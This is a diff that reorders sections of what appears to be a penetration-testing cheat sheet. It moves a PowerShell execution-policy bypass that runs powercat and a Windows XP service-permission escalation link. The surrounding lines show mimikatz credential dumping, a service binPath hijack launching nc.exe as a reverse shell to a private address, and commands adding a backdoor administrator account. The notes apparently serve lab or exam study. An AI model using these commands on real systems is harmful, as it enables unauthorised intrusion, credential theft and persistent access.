@@ -177,12 +177,6 @@ locate webshell to list webshell
 common used: php-reverse-shell.php
 ```
 
-## Powershell execute .ps1 file
-```
-add command at end of .ps1 file, then
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -file powercat.ps1
-```
-
 ## Exploitation
 Linux
 ```
@@ -237,6 +231,12 @@ lsadump::lsa /inject
 kerberos::list /dump
 
 klist
+```
+
+## Powershell execute .ps1 file
+```
+add command at end of .ps1 file, then
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -file powercat.ps1
 ```
 
 ## Exploit compiling
@@ -303,15 +303,15 @@ sc config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 192.168
 sc qc usosvc
 shutdown /r /t 0
 
+#Windows XP SP1 upnphost service
+https://guif.re/windowseop#EoP%201:%20Incorrect%20permissions%20in%20services
+
 #Add new user
 net user test 1234 /add
 net localgroup administrators test /add
 
 #Print proof
 type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
-
-#Windows XP SP1 upnphost service
-https://guif.re/windowseop#EoP%201:%20Incorrect%20permissions%20in%20services
 ```
 
 ## Post exploitation 
